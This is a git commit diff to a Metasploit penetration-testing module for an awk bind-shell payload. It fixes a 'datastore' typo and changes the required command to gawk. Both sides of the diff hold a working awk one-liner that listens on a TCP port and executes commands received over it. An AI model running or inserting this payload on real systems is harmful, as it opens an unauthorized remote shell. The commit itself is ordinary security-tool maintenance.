e2988727fbf989cf781991806880603923c1a631
Roberto Soares Espreto <robertoespreto@gmail.com>
2013-06-04 21:10:51 -0300

    Some changes with improvements.

--- modules/payloads/singles/cmd/unix/bind_awk.rb
+++ modules/payloads/singles/cmd/unix/bind_awk.rb
@@ -30,7 +30,7 @@ module Metasploit4
 			'Handler'       => Msf::Handler::BindTcp,
 			'Session'       => Msf::Sessions::CommandShell,
 			'PayloadType'   => 'cmd',
-			'RequiredCmd'   => 'awk',
+			'RequiredCmd'   => 'gawk',
 			'Payload'       =>
 				{
 					'Offsets' => { },
@@ -50,7 +50,7 @@ module Metasploit4
 	# Returns the command string to use for execution
 	#
 	def command_string
-		"awk 'BEGIN{for(s=\"/inet/tcp/#{dastore['LPORT']}/0/0\";s|&getline c;close(c)){while(c|&getline)print$0|&s}}'"
+		"awk 'BEGIN{for(s=\"/inet/tcp/#{datastore['LPORT']}/0/0\";s|&getline c;close(c)){while(c|&getline)print$0|&s}}'"
 	end
 
 end
